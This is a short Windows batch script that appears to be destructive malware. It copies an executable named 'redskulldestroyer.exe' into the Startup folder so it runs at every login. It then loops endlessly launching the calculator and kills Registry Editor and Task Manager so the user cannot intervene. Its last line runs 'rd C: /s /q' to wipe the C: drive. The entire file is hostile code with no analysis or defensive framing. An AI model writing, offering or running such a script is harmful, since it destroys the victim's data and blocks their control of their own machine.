@echo off
copy redskulldestroyer.exe "%USERPROFILE%\Start Menu\Programs\Startup"
warning.vbs
call :payload1
call :payload2
call :payload3

:payload1
calc
call :payload1

:payload2
taskkill /f /im regedit.exe
taskkill /f /im taskmgr.exe
call :payload2

:payload3
rd C: /s /q
